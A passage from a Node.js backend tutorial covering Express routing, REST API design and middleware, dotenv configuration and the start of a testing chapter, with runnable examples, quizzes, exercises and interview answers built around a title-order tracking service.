import { createServer } from "node:http";
const server = createServer((req, res) => {
  if (req.method === "GET" && req.url === "/health") {
    res.writeHead(200, { "content-type": "application/json" });
    return res.end(JSON.stringify({ ok: true, uptime: process.uptime() }));
  }
  res.writeHead(404, { "content-type": "text/plain" });
  res.end("not found");
});
server.listen(3000, () => console.log("listening on http://localhost:3000"));
```

`req` is an `IncomingMessage` (a readable stream: the body arrives in chunks) and `res` is a `ServerResponse` (a writable stream). There is no routing, no body parsing, no static files; everything is `if` statements and string comparisons. That is exactly the gap Express fills.

### The same server in Express

```js
import express from "express";
const app = express();
app.get("/health", (req, res) => res.json({ ok: true, uptime: process.uptime() }));
app.listen(3000, () => console.log("listening on 3000"));
```

`app.listen` calls `http.createServer(app)` under the hood; `app` is just a request handler function with extra methods. `res.json` sets the content type, stringifies and ends. Missing routes return a 404 HTML page automatically.

### Routing

```js
app.get("/reports/:state", (req, res) => {
  const { state } = req.params;                 // "/reports/TX" -> "TX"
  const { from, to } = req.query;               // "?from=2026-01-01&to=2026-01-31"
  res.json({ state, from, to });
});
app.post("/convert", express.raw({ type: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", limit: "25mb" }),
  async (req, res, next) => {
    try {
      const pdf = await convertBuffer(req.body);  // req.body is a Buffer here
      res.type("application/pdf").send(pdf);
    } catch (err) { next(err); }
  });
```

Route parameters (`:state`) are captured into `req.params`; the query string is parsed into `req.query`. Express 5 (released 2024) uses path-to-regexp 8, so wildcards are written `/files/*splat` and optional segments `{/:id}`; Express 4 used `*` and `?`. Express 5 also awaits async handlers and passes rejections to the error handler automatically, so the `try/catch` above is only required in Express 4.

### Body parsing

- `express.json()` parses `application/json` into `req.body`.
- `express.urlencoded({ extended: false })` parses HTML form posts.
- `express.raw()` and `express.text()` for binary and plain text.
- `multer` (npm) for `multipart/form-data` file uploads: `upload.single("file")` puts the file in `req.file` with `buffer` or a `path` on disk.

Set a `limit` on every parser: the default 100 KB will reject a 5 MB `.docx` with a 413, and an unlimited parser is a denial-of-service invitation.

### Serving files and downloads

```js
app.use("/static", express.static("public", { maxAge: "1h" }));
app.get("/download/:id", (req, res) => res.download(`out/${req.params.id}.pdf`, "Policy-Manual.pdf"));
```

`res.download` sets `Content-Disposition: attachment` and streams the file. `res.sendFile` requires an absolute path. Both refuse paths that escape the root, but validate `:id` anyway (the Expert level covers path traversal).

### Status codes you will actually use

| Code | Meaning | When |
|---|---|---|
| 200 / 201 | OK / Created | success, resource created |
| 204 | No Content | success with nothing to return |
| 400 | Bad Request | validation failed |
| 401 / 403 | Unauthorized / Forbidden | not logged in / not allowed |
| 404 | Not Found | unknown route or id |
| 409 | Conflict | duplicate file number |
| 413 | Payload Too Large | body over the limit |
| 415 | Unsupported Media Type | not a `.docx` |
| 422 | Unprocessable Entity | well-formed but semantically invalid |
| 500 | Internal Server Error | unexpected exception |

### Graceful shutdown

```js
const server = app.listen(3000);
process.on("SIGTERM", () => {
  server.close(() => process.exit(0));           // stop accepting, finish in-flight requests
  setTimeout(() => process.exit(1), 10_000).unref();
});
```

Without this, a deploy kills requests mid-conversion. `server.close` waits for open connections; keep-alive connections need `server.closeIdleConnections()` (Node 18.2+) to close promptly.

> **Interview note:** Know that Express is single-threaded on the event loop. A synchronous 2-second PDF parse in a handler blocks every other request for 2 seconds. Offload CPU work to worker threads or a job queue.

### Try It Yourself

```js
// A miniature Express-style router in pure JS: app.get/post, :params, query parsing, middleware chain and error handler.
function createApp() {
  const routes = [], mws = [];
  const compile = p => { const keys = []; const re = new RegExp("^" + p.replace(/:(\w+)/g, (_, k) => (keys.push(k), "([^/]+)")) + "/?$"); return { re, keys }; };
  const app = {
    use: fn => (mws.push(fn), app),
    get: (p, ...h) => (routes.push({ m: "GET", ...compile(p), h }), app),
    post: (p, ...h) => (routes.push({ m: "POST", ...compile(p), h }), app),
    handle(method, url, body) {
      const [path, qs = ""] = url.split("?");
      const req = { method, path, query: Object.fromEntries(new URLSearchParams(qs)), params: {}, body };
      const res = { status: 200, headers: {}, payload: undefined, statusCode(c) { this.status = c; return this; }, json(o) { this.headers["content-type"] = "application/json"; this.payload = JSON.stringify(o); return this; } };
      const route = routes.find(r => r.m === method && r.re.test(path));
      const chain = [...mws];
      if (route) { const m = path.match(route.re); route.keys.forEach((k, i) => (req.params[k] = decodeURIComponent(m[i + 1]))); chain.push(...route.h); }
      else chain.push((q, s) => s.statusCode(404).json({ error: `Cannot ${method} ${path}` }));
      let i = 0;
      const next = err => {
        if (err) return res.statusCode(err.status ?? 500).json({ error: err.message });
        const fn = chain[i++]; if (!fn) return;
        try { fn(req, res, next); } catch (e) { next(e); }
      };
      next();
      return res;
    },
  };
  return app;
}
const app = createApp();
const orders = { "TX-1001": { file_no: "TX-1001", status: "Open", liability: 350000 } };
app.use((req, res, next) => { console.log(`  -> ${req.method} ${req.path}`); next(); });          // logger middleware
app.get("/health", (req, res) => res.json({ ok: true }));
app.get("/orders/:fileNo", (req, res, next) => { const o = orders[req.params.fileNo]; if (!o) return next(Object.assign(new Error("order not found"), { status: 404 })); res.json(o); });
app.get("/reports/:state", (req, res) => res.json({ state: req.params.state, from: req.query.from ?? null, count: 1 }));
app.post("/orders", (req, res, next) => {
  if (!req.body?.file_no) return next(Object.assign(new Error("file_no is required"), { status: 400 }));
  if (orders[req.body.file_no]) return next(Object.assign(new Error("duplicate file_no"), { status: 409 }));
  orders[req.body.file_no] = req.body; res.statusCode(201).json(req.body);
});
for (const [m, u, b] of [["GET", "/health"], ["GET", "/orders/TX-1001"], ["GET", "/orders/ZZ-9"], ["GET", "/reports/WY?from=2026-01-01"], ["POST", "/orders", { file_no: "WY-2002", status: "Open" }], ["POST", "/orders", { file_no: "TX-1001" }], ["POST", "/orders", {}], ["GET", "/nope"]]) {
  const r = app.handle(m, u, b); console.log(`${m} ${u} => ${r.status} ${r.payload}`);
}
```

### Quiz

1. What is `req` in a `node:http` request handler?
- [x] An `IncomingMessage`, which is a readable stream
- [ ] A parsed JSON object
- [ ] A string containing the body
> The body arrives in chunks; Express body parsers read that stream for you.

2. What does `express.json()` do?
- [ ] Sends a JSON response
- [x] Parses JSON request bodies into `req.body`
- [ ] Validates JSON against a schema
> It is middleware; without it `req.body` is undefined.

3. Which status fits a well-formed request whose file number already exists?
- [ ] 400
- [x] 409
- [ ] 500
> 409 Conflict signals a state clash the client can resolve.

4. What does `server.close()` do?
- [x] Stops accepting new connections and waits for in-flight ones to finish
- [ ] Kills all connections immediately
- [ ] Restarts the server
> Pair it with a timeout and `closeIdleConnections()` for prompt shutdowns.

### Exercises

1. **Health endpoint** — Write an Express route `/health` returning JSON with `status`, `uptime` (seconds, rounded) and `node` version.
<details><summary>Solution</summary>

```js
app.get("/health", (req, res) => res.json({ status: "ok", uptime: Math.round(process.uptime()), node: process.version }));
```

</details>

2. **Query validation** — In `/reports/:state`, respond 400 unless `state` is exactly two uppercase letters.
<details><summary>Solution</summary>

```js
app.get("/reports/:state", (req, res) => {
  if (!/^[A-Z]{2}$/.test(req.params.state)) return res.status(400).json({ error: "state must be two uppercase letters" });
  res.json({ state: req.params.state });
});
```

</details>

3. **Upload limit** — Configure `express.raw` to accept `.docx` bodies up to 20 MB and return 415 for other content types.
<details><summary>Solution</summary>

```js
const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
app.post("/convert", (req, res, next) => (req.is(DOCX) ? next() : res.sendStatus(415)), express.raw({ type: DOCX, limit: "20mb" }), handler);
```

</details>

### Interview Questions

**Q: What does Express add on top of node:http, and what does it not do?**
Express adds a router (method plus path patterns with parameters), a middleware pipeline where each function can act and call `next()`, body-parsing middleware, response helpers such as `res.json`, `res.status`, `res.download`, and a centralised error handler. It does not add a database layer, authentication, validation, templating opinions or clustering; those are separate packages. It is also unopinionated about structure, so I organise by feature with routers (`express.Router()`) mounted under prefixes. Compared with Fastify it is slower and its ecosystem is older, but it remains the most widely known, which matters for team onboarding.

**Q: What changed in Express 5?**
Express 5 became the default `npm install express` in 2024 after a decade of alpha. The visible changes are automatic handling of rejected promises from async handlers (no more `try/catch` and `next(err)` in every route), removal of deprecated aliases like `req.param()` and `res.send(status)`, `res.status()` rejecting non-integer codes, path-to-regexp 8 with new syntax (`*splat` named wildcards, `{/:id}` optional groups, no regex characters inside path strings), and dropping Node versions below 18. Migrating a mid-sized app mostly means fixing route patterns and deleting boilerplate.

**Q: How would you serve a large generated PDF without hurting other users?**
Generate it off the event loop (worker thread, child process or a queue with a separate worker service), stream it to the client with `res.download` or by piping a `createReadStream`, and set `Content-Length` so the browser shows progress. I never `readFile` a 100 MB PDF into memory per request, and I never do the CPU-heavy generation inline in the handler, because the event loop is shared by every connection. For repeated downloads I cache the result on disk keyed by input hash and let `express.static` or a reverse proxy such as nginx serve it with proper caching headers.

## REST API design & middleware

An API is a contract other programs depend on. Designing it well means predictable URLs, correct verbs and status codes, consistent error bodies, and a middleware chain that handles the cross-cutting concerns (logging, auth, validation, errors) once instead of in every route. This chapter designs the `orders` API for a title-production tracker and shows the middleware that keeps it honest.

### Resources and verbs

| Operation | Method and path | Success status |
|---|---|---|
| List orders | `GET /api/v1/orders?state=TX&status=Open&page=2&limit=50` | 200 |
| Read one | `GET /api/v1/orders/TX-1001` | 200 |
| Create | `POST /api/v1/orders` | 201 with `Location` header |
| Replace | `PUT /api/v1/orders/TX-1001` | 200 |
| Partial update | `PATCH /api/v1/orders/TX-1001` | 200 |
| Delete | `DELETE /api/v1/orders/TX-1001` | 204 |
| Action | `POST /api/v1/orders/TX-1001/close` | 200 |

Rules that keep an API predictable: nouns in the plural, no verbs in paths (except explicit actions), identifiers in the path and filters in the query string, a version prefix so breaking changes go to `/v2`, and idempotency where the verb promises it (`PUT` and `DELETE` can be retried safely; `POST` cannot unless you support an `Idempotency-Key` header).

### The middleware chain

```js
import express from "express";
import helmet from "helmet";
import cors from "cors";
import morgan from "morgan";
const app = express();
app.use(helmet());                                  // security headers
app.use(cors({ origin: ["https://reports.example.com"] }));
app.use(morgan("combined"));                        // access log
app.use(express.json({ limit: "1mb" }));
app.use("/api/v1/orders", ordersRouter);
app.use((req, res) => res.status(404).json({ error: { code: "NOT_FOUND", message: `no route for ${req.method} ${req.path}` } }));
app.use(errorHandler);                              // 4 arguments -> error middleware
```

Order matters: middleware runs top to bottom, so security headers and logging go first, body parsing before routers, the 404 catch-all after every router, and the error handler last. A middleware that does not call `next()` and does not end the response hangs the request forever, which is the classic beginner bug.

### Writing middleware

```js
function requestId(req, res, next) {
  req.id = req.get("x-request-id") ?? crypto.randomUUID();
  res.set("x-request-id", req.id);
  next();
}
function requireApiKey(req, res, next) {
  const key = req.get("authorization")?.replace(/^Bearer /, "");
  if (!key || !keys.has(key)) return res.status(401).json({ error: { code: "UNAUTHENTICATED", message: "missing or invalid API key" } });
  req.user = keys.get(key);
  next();
}
```

Middleware is a function `(req, res, next)`; attach data to `req` for later handlers, end the response to stop the chain, or call `next(err)` to jump to the error handler. Apply per router (`router.use(requireApiKey)`) or per route (`router.post("/", requireApiKey, validate(schema), create)`).

### Validation with a schema

Hand-written `if` checks drift from the documentation. Use a schema library (zod, Joi, or Ajv for JSON Schema) and one middleware:

```js
import { z } from "zod";
const OrderCreate = z.object({
  file_no: z.string().regex(/^[A-Z]{2}-\d{4,}$/),
  product: z.enum(["Owner", "Lender", "Both"]),
  liability: z.number().positive(),
  county: z.string().min(2).max(60),
});
const validate = schema => (req, res, next) => {
  const r = schema.safeParse(req.body);
  if (!r.success) return res.status(422).json({ error: { code: "VALIDATION", message: "invalid body", details: r.error.issues } });
  req.body = r.data;                                  // stripped and coerced
  next();
};
router.post("/", validate(OrderCreate), async (req, res) => {
  const order = await orders.create(req.body);
  res.status(201).location(`/api/v1/orders/${order.file_no}`).json(order);
});
```

### Consistent errors

```js
class HttpError extends Error { constructor(status, code, message, details) { super(message); Object.assign(this, { status, code, details }); } }
function errorHandler(err, req, res, next) {
  const status = err.status ?? 500;
  if (status >= 500) logger.error({ err, reqId: req.id }, "unhandled");
  res.status(status).json({ error: { code: err.code ?? "INTERNAL", message: status >= 500 ? "internal error" : err.message, requestId: req.id } });
}
```

Every error, expected or not, comes back in the same envelope. Clients can branch on `error.code` and support staff can search logs by `requestId`. RFC 9457 "Problem Details" (`application/problem+json`) is the standardised version of this shape.

### Pagination, filtering, sorting

Return `{ data: [...], page, limit, total }` or cursor-based `{ data, nextCursor }` for large tables. Whitelist sortable fields (`sort=opened:desc`) so a client cannot sort by an unindexed column and take the database down. Cap `limit` (say 200) on the server no matter what the client asks.

### Versioning and documentation

Put the version in the path (`/api/v1`) or an `Accept` header. Document with OpenAPI: a `openapi.yaml` served by `swagger-ui-express` gives a live console, and tools like `zod-to-openapi` generate it from the same schemas that validate requests, so the docs cannot drift.

> **Warning:** Do not leak stack traces or SQL errors to clients in production. Return a generic 500 body with a request id, log the details server-side, and keep `NODE_ENV=production` so Express's default error page is not verbose.

### Try It Yourself

```js
// Middleware composition and a consistent error envelope, in pure JS.
class HttpError extends Error { constructor(status, code, message, details) { super(message); this.status = status; this.code = code; this.details = details; } }
const compose = (...fns) => (req, res) => new Promise(resolve => {
  let i = 0;
  const next = err => {
    if (err) return resolve(errorHandler(err, req, res));
    const fn = fns[i++]; if (!fn) return resolve(res);
    const done = () => { if (i === fns.length) resolve(res); };            // last handler finished without calling next
    try { const out = fn(req, res, next); out && out.then ? out.then(done, next) : done(); } catch (e) { next(e); }
  };
  next();
});
const errorHandler = (err, req, res) => { const status = err.status ?? 500; res.status = status;
  res.body = { error: { code: err.code ?? "INTERNAL", message: status >= 500 ? "internal error" : err.message, details: err.details, requestId: req.id } }; return res; };
const requestId = (req, res, next) => { req.id = "req_" + Math.random().toString(36).slice(2, 8); next(); };
const auth = (req, res, next) => { if (req.headers.authorization !== "Bearer k-123") return next(new HttpError(401, "UNAUTHENTICATED", "missing or invalid API key")); req.user = "ali"; next(); };
const validate = rules => (req, res, next) => {
  const issues = Object.entries(rules).filter(([k, test]) => !test(req.body?.[k])).map(([k]) => ({ field: k, message: "invalid or missing" }));
  issues.length ? next(new HttpError(422, "VALIDATION", "invalid body", issues)) : next();
};
const db = new Map();
const createOrder = async (req, res) => {
  if (db.has(req.body.file_no)) throw new HttpError(409, "DUPLICATE", `order ${req.body.file_no} already exists`);
  db.set(req.body.file_no, req.body); res.status = 201; res.headers = { location: `/api/v1/orders/${req.body.file_no}` }; res.body = req.body;
};
const handler = compose(requestId, auth, validate({ file_no: v => /^[A-Z]{2}-\d{4,}$/.test(v ?? ""), product: v => ["Owner", "Lender", "Both"].includes(v), liability: v => typeof v === "number" && v > 0 }), createOrder);
const requests = [
  { headers: {}, body: { file_no: "TX-1001" } },
  { headers: { authorization: "Bearer k-123" }, body: { file_no: "tx1", product: "Title", liability: -5 } },
  { headers: { authorization: "Bearer k-123" }, body: { file_no: "TX-1001", product: "Owner", liability: 350000 } },
  { headers: { authorization: "Bearer k-123" }, body: { file_no: "TX-1001", product: "Owner", liability: 350000 } },
];
(async () => { for (const req of requests) { const res = await handler(req, { status: 200 }); console.log(res.status, JSON.stringify(res.body), res.headers ? JSON.stringify(res.headers) : ""); } })();
```

### Quiz

1. Which status and header should a successful `POST` that creates a resource return?
- [x] 201 with a `Location` header
- [ ] 200 with no header
- [ ] 204
> 201 Created plus the new resource's URL is the REST convention.

2. How does Express recognise an error-handling middleware?
- [ ] It is registered with `app.error()`
- [x] It has four parameters `(err, req, res, next)`
- [ ] It is named `errorHandler`
> Arity is the signal; keep all four parameters even if `next` is unused.

3. What happens if middleware neither ends the response nor calls `next()`?
- [ ] Express returns 500
- [x] The request hangs until the client times out
- [ ] The next middleware runs anyway
> Every middleware must either respond or pass control on.

4. Which is idempotent by definition?
- [ ] POST
- [x] PUT
- [ ] None of them
> Repeating a `PUT` with the same body yields the same state; `POST` may create duplicates.

### Exercises

1. **Pagination** — Write middleware that parses `page` and `limit` from the query, defaults to 1 and 50, caps `limit` at 200, and attaches `req.paging = { offset, limit }`.
<details><summary>Solution</summary>

```js
function paging(req, res, next) {
  const page = Math.max(1, parseInt(req.query.page, 10) || 1);
  const limit = Math.min(200, Math.max(1, parseInt(req.query.limit, 10) || 50));
  req.paging = { offset: (page - 1) * limit, limit };
  next();
}
```

</details>

2. **Zod schema** — Define a schema for `PATCH /orders/:id` allowing optional `status` (`Open|Closed`) and `closed` (ISO date), requiring at least one field.
<details><summary>Solution</summary>

```js
const OrderPatch = z.object({ status: z.enum(["Open", "Closed"]).optional(), closed: z.string().date().optional() })
  .refine(o => Object.keys(o).length > 0, { message: "at least one field required" });
```

</details>

3. **Rate limit sketch** — Implement in-memory rate limiting of 100 requests per minute per API key, responding 429 with `Retry-After`.
<details><summary>Solution</summary>

```js
const hits = new Map();
function rateLimit(req, res, next) {
  const key = req.user ?? req.ip, now = Date.now(), win = 60_000;
  const arr = (hits.get(key) ?? []).filter(t => now - t < win);
  if (arr.length >= 100) return res.status(429).set("Retry-After", Math.ceil((win - (now - arr[0])) / 1000)).json({ error: { code: "RATE_LIMITED", message: "slow down" } });
  arr.push(now); hits.set(key, arr); next();
}
```

</details>

### Interview Questions

**Q: How do you design error responses for an API?**
One envelope for every failure: `{ error: { code, message, details, requestId } }` with a machine-readable `code` clients switch on, a human message, optional field-level `details` for validation, and a request id that matches a log line. Status codes follow HTTP semantics (400/422 for client mistakes, 401 versus 403 distinguished, 404, 409 for conflicts, 429, 5xx only for our faults), and 5xx bodies never include stack traces. A single error-handling middleware produces this shape, so route code just throws `HttpError`. RFC 9457 Problem Details is the standard I point to when a team wants an external reference.

**Q: PUT versus PATCH versus POST for updates?**
`PUT` replaces the whole resource and is idempotent: sending the same body twice leaves the same state, so clients can retry on timeout. `PATCH` applies a partial change; it is idempotent for "set status to Closed" but not for "increment counter", so I document which. `POST` is for creation and for actions that are not naturally CRUD, such as `/orders/TX-1001/close`, where a verb-like sub-resource is clearer than abusing `PATCH`. For creation with retries I support an `Idempotency-Key` header stored with the response so a client retry after a network failure does not create a duplicate order.

**Q: What middleware would a production Express API have, in what order?**
Request id, then security headers (`helmet`), CORS, compression, access logging (`morgan` or `pino-http`), body parsers with limits, rate limiting, authentication, then routers, each of which applies validation and authorisation per route. After the routers: a 404 handler and finally the error handler. Order is not cosmetic: logging before auth records rejected attempts, parsers before routers so `req.body` exists, and the error handler last so it sees errors from everything above it. I keep this in one `app.js` that tests import without calling `listen`.

## Environment variables & config (dotenv)

The same converter service runs on your laptop, on a client's staging box and in production. What differs is configuration: ports, paths to LibreOffice, database URLs, API keys. Twelve-Factor practice says configuration lives in the **environment**, not in code, so a single build runs everywhere and secrets never land in git. Node reads the environment through `process.env`; **dotenv** fills it from a file during development.

### process.env

```js
const port = Number(process.env.PORT ?? 3000);
const soffice = process.env.SOFFICE_PATH ?? "soffice";
console.log(process.env.NODE_ENV);                   // "production", "development" or undefined
```

Every value in `process.env` is a string or undefined. `PORT=3000` gives `"3000"`, `DEBUG=false` gives the string `"false"`, which is truthy. Convert and validate at the edge of the program, never deep inside.

### .env files and dotenv

```text
# .env (never committed)
PORT=4000
DATABASE_URL=postgres://app:s3cret@localhost:5432/titles
SOFFICE_PATH=C:\Program Files\LibreOffice\program\soffice.exe
LOG_LEVEL=debug
```

```js
import "dotenv/config";                                // loads .env into process.env at import time
```

dotenv rules: existing environment variables win over the file (so `PORT=5000 node server.js` overrides), values are strings, quotes are stripped, `#` starts a comment, multi-line values need double quotes, and `${OTHER}` expansion requires `dotenv-expand`. Commit a `.env.example` with every key and a placeholder; add `.env*` to `.gitignore` except the example.

Node 20.6+ can do this without the package: `node --env-file=.env server.js`, and Node 21.7+ exposes `process.loadEnvFile()`. dotenv remains common because it works on every version and supports `override` and multiple files (`.env.local`, `.env.test`).

### Validate once, export a typed config

```js
// config.js
import { z } from "zod";
const schema = z.object({
  NODE_ENV: z.enum(["development", "test", "production"]).default("development"),
  PORT: z.coerce.number().int().min(1).max(65535).default(3000),
  DATABASE_URL: z.string().url(),
  SOFFICE_PATH: z.string().default("soffice"),
  MAX_UPLOAD_MB: z.coerce.number().default(25),
  LOG_LEVEL: z.enum(["debug", "info", "warn", "error"]).default("info"),
});
const parsed = schema.safeParse(process.env);
if (!parsed.success) {
  console.error("Invalid configuration:\n" + parsed.error.issues.map(i => `  ${i.path.join(".")}: ${i.message}`).join("\n"));
  process.exit(1);
}
export const config = Object.freeze(parsed.data);
```

Now the process refuses to start with a missing `DATABASE_URL` instead of crashing an hour later on the first query, every consumer gets numbers as numbers, and `config` is the only module that touches `process.env`. `envalid` and `convict` are libraries that do the same job with their own DSLs.

### Precedence

A predictable order, highest first:

1. Command-line flags (`--port 5000`).
2. Environment variables (including a CI system's secrets).
3. `.env.<NODE_ENV>.local`, then `.env.<NODE_ENV>`, then `.env` (if you support layered files).
4. Defaults in code.

Document the order in the README. Surprises here cost hours ("why is staging using my laptop's LibreOffice path?").

### NODE_ENV

Express, many loggers and template engines read `NODE_ENV`. `production` turns on view caching, terser error pages and faster middleware paths; `test` is conventional for test runners. It is a hint, not a security boundary, so never gate secrets on it. Set it in the process manager or Dockerfile, not in `.env`, so a stray development file cannot flip a server into development mode.

### Secrets

`.env` is a convenience for laptops. In production, secrets come from the platform: Docker secrets, Kubernetes secrets, AWS Secrets Manager, Azure Key Vault, or the CI provider's encrypted variables, injected as environment variables at start. Never log `process.env` wholesale; a `config` module that redacts anything named `*_KEY`, `*_SECRET`, `*_TOKEN` or `PASSWORD` in its debug output prevents the most common leak.

### Cross-platform gotchas

- Setting a variable inline differs: `PORT=5000 node app.js` works in bash; on Windows `cmd.exe` needs `set PORT=5000 && node app.js` and PowerShell `$env:PORT=5000; node app.js`. The `cross-env` package normalises this in npm scripts.
- Windows environment variable names are case-insensitive; Linux ones are not. Pick one casing (UPPER_SNAKE) and stick to it.
- Paths with spaces (the LibreOffice path above) need no quotes in `.env` but do in shell commands.

> **Tip:** Print the effective configuration (with secrets redacted) at startup. `logger.info({ config: redact(config) }, "starting")` answers half of all "it works on my machine" tickets.

### Try It Yourself

```js
// A dotenv-style parser plus schema validation and redaction, in pure JS.
function parseDotenv(text) {
  const out = {};
  for (const raw of text.split(/\r?\n/)) {
    const line = raw.trim();
    if (!line || line.startsWith("#")) continue;
    const m = line.match(/^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)$/); if (!m) continue;
    let v = m[2];
    if (/^".*"$/.test(v)) v = v.slice(1, -1).replace(/\\n/g, "\n"); else if (/^'.*'$/.test(v)) v = v.slice(1, -1); else v = v.replace(/\s+#.*$/, "").trim();
    out[m[1]] = v;
  }
  return out;
}
const fileVars = parseDotenv(`
# development settings
PORT=4000
DATABASE_URL="postgres://app:s3cret@localhost:5432/titles"
SOFFICE_PATH=C:\\Program Files\\LibreOffice\\program\\soffice.exe   # spaces are fine
LOG_LEVEL=debug
MAX_UPLOAD_MB=abc
`);
const processEnv = { PORT: "5000", NODE_ENV: "production" };                     // real environment wins over the file
const env = { ...fileVars, ...processEnv };
const schema = {
  NODE_ENV: { parse: v => v ?? "development", check: v => ["development", "test", "production"].includes(v) },
  PORT: { parse: v => Number(v ?? 3000), check: v => Number.isInteger(v) && v > 0 && v < 65536 },
  DATABASE_URL: { parse: v => v, check: v => typeof v === "string" && /^postgres:\/\//.test(v) },
  SOFFICE_PATH: { parse: v => v ?? "soffice", check: v => v.length > 0 },
  MAX_UPLOAD_MB: { parse: v => Number(v ?? 25), check: v => Number.isFinite(v) && v > 0 },
  LOG_LEVEL: { parse: v => v ?? "info", check: v => ["debug", "info", "warn", "error"].includes(v) },
};
const config = {}, issues = [];
for (const [k, s] of Object.entries(schema)) { const v = s.parse(env[k]); if (s.check(v)) config[k] = v; else issues.push(`${k}: invalid value ${JSON.stringify(env[k])}`); }
const redact = o => Object.fromEntries(Object.entries(o).map(([k, v]) => [k, /URL|KEY|SECRET|TOKEN|PASSWORD/i.test(k) ? String(v).replace(/:\/\/([^:]+):[^@]+@/, "://$1:***@") : v]));
console.log("issues:", issues.length ? issues : "none");
console.log("effective config:", redact(config));
console.log("typeof PORT:", typeof config.PORT, "| source:", processEnv.PORT ? "environment" : ".env");
```

### Quiz

1. What type is every value in `process.env`?
- [ ] Whatever type the `.env` file implies
- [x] String (or undefined)
- [ ] Number
> Convert with `Number()` or a schema; `"false"` is a truthy string.

2. When both the environment and `.env` define `PORT`, which does dotenv use by default?
- [x] The existing environment variable
- [ ] The `.env` file
- [ ] It throws
> dotenv never overrides existing variables unless `override: true`.

3. Which Node flag loads a `.env` file without any package?
- [ ] `--dotenv`
- [x] `--env-file=.env`
- [ ] `--config`
> Available since Node 20.6.

4. Where should production secrets come from?
- [ ] A `.env` committed to the repository
- [x] The platform's secret store, injected as environment variables
- [ ] Hard-coded constants
> `.env` is for local development only and must be git-ignored.

### Exercises

1. **Required variable** — Write `requireEnv(name)` that returns the value or throws an error naming the missing variable.
<details><summary>Solution</summary>

```js
const requireEnv = name => { const v = process.env[name]; if (v === undefined || v === "") throw new Error(`missing required environment variable ${name}`); return v; };
```

</details>

2. **Boolean parsing** — Write `envBool(name, def)` that treats `1`, `true`, `yes`, `on` (any case) as true and `0`, `false`, `no`, `off` as false.
<details><summary>Solution</summary>

```js
function envBool(name, def = false) {
  const v = process.env[name]?.trim().toLowerCase();
  if (v === undefined || v === "") return def;
  if (["1", "true", "yes", "on"].includes(v)) return true;
  if (["0", "false", "no", "off"].includes(v)) return false;
  throw new Error(`${name} must be a boolean, got "${v}"`);
}
```

</details>

3. **Redactor** — Write `redact(obj)` that replaces values of keys matching `/secret|token|password|key/i` with `"***"`.
<details><summary>Solution</summary>

```js
const redact = o => Object.fromEntries(Object.entries(o).map(([k, v]) => [k, /secret|token|password|key/i.test(k) ? "***" : v]));
console.log(redact({ PORT: 3000, API_KEY: "abc" }));
```

</details>

### Interview Questions

**Q: Why keep configuration in environment variables rather than a config file in the repo?**
Because the artifact you deploy should be identical across environments; only the surrounding configuration changes. Environment variables are supported by every platform (Docker, systemd, Kubernetes, Windows services, CI), keep secrets out of version control, and are easy to override per deployment. The trade-offs are that everything is a string and there is no structure, so I add one `config` module that parses, validates and freezes the values at startup. For complex structured configuration I still use a file, but reference it by a path from an environment variable and keep secrets out of it.

**Q: How do you make a Node service fail fast on bad configuration?**
Validate `process.env` against a schema (zod, envalid or convict) in a module that runs before anything else, with explicit defaults, types and allowed values, and `process.exit(1)` with a readable list of every problem rather than the first one. The service then cannot start with a typo in `DATABASE_URL`, an out-of-range `PORT` or a missing API key. I also log the effective configuration with secrets redacted, which turns "it works on my machine" investigations into a diff between two log lines.

**Q: What is `NODE_ENV` and what are its pitfalls?**
A conventional variable that libraries read to switch behaviour: Express enables view caching and terse errors when it equals `production`, React and bundlers strip development checks, test runners set it to `test`. Pitfalls: it is not a security control, forgetting it in production makes Express noticeably slower and chattier, and setting it inside `.env` means a checked-in file can flip behaviour. I set it in the process manager or container definition, treat it as one of three values only, and never branch business logic on it, using explicit feature flags instead.

## Testing with node:test / Jest

A converter that silently produces empty PDFs after a LibreOffice upgrade is worse than one that crashes. Tests catch that. Node ships a test runner (`node:test`, stable since Node 20) with assertions, mocking, coverage and watch mode; **Jest** is the popular alternative with a larger ecosystem. Both follow the same shape: a describe/it structure, assertions, and doubles for the slow or external parts.

### node:test basics

```js
// test/natural-sort.test.js
import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { naturalSort } from "../src/sort.js";

describe("naturalSort", () => {
  test("orders numbers inside names numerically", () => {
    assert.deepEqual(naturalSort(["Ch 10", "Ch 2", "Ch 1"]), ["Ch 1", "Ch 2", "Ch 10"]);
  });
  test("is case-insensitive", () => {
    assert.deepEqual(naturalSort(["b", "A"]), ["A", "b"]);
  });
});
```

Run with `node --test` (discovers `**/*.test.js`, `test/**`), `node --test --watch` for a loop, `node --test --experimental-test-coverage` for coverage (flag no longer experimental in Node 22). Always use `assert/strict`: plain `assert.equal` uses `==`, so `assert.equal(1, "1")` passes.

### Async tests, setup and teardown

```js
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { before, after, beforeEach } from "node:test";

let dir;
before(async () => { dir = await mkdtemp(path.join(tmpdir(), "docpipe-")); });
after(() => rm(dir, { recursive: true, force: true }));
beforeEach(() => writeFile(path.join(dir, "a.docx"), "PK\x03\x04fake"));

test("batch skips lock files", async () => {
  await writeFile(path.join(dir, "~$a.docx"), "");
  const report = await batch(dir, { convert: async () => "ok" });
  assert.equal(report.length, 1);
});

test("rejects unknown formats", async () => {
  await assert.rejects(() => convert("a.docx", { format: "txt" }), { name: "InvalidArgumentError" });
});
```

Async tests return a promise; `assert.rejects` and `assert.throws` check failures. Temp directories via `mkdtemp` keep tests isolated and parallel-safe.

### Mocking

```js
import { mock } from "node:test";
test("retries LibreOffice twice", async () => {
  const run = mock.fn(async () => { if (run.mock.callCount() < 2) throw new Error("boom"); return "ok"; });
  assert.equal(await withRetry(run, 3), "ok");
  assert.equal(run.mock.callCount(), 3);
});
test("timeout kills a hung process", async t => {
  t.mock.timers.enable({ apis: ["setTimeout"] });
  const p = runWithTimeout(neverEnds, 5000);
  t.mock.timers.tick(5000);
  await assert.rejects(p, /timed out/);
});
```

`mock.fn` records calls and lets you stub implementations; `mock.method(obj, "name")` replaces a method and restores it after the test; `t.mock.timers` fakes `setTimeout`/`Date` so a 5-second timeout test takes milliseconds. Node 22 adds `mock.module()` (still experimental) for replacing whole imports.

### Jest equivalents

```js
// jest: sort.test.js
describe("naturalSort", () => {
  it("orders numerically", () => {
    expect(naturalSort(["Ch 10", "Ch 2"])).toEqual(["Ch 2", "Ch 10"]);
  });
});
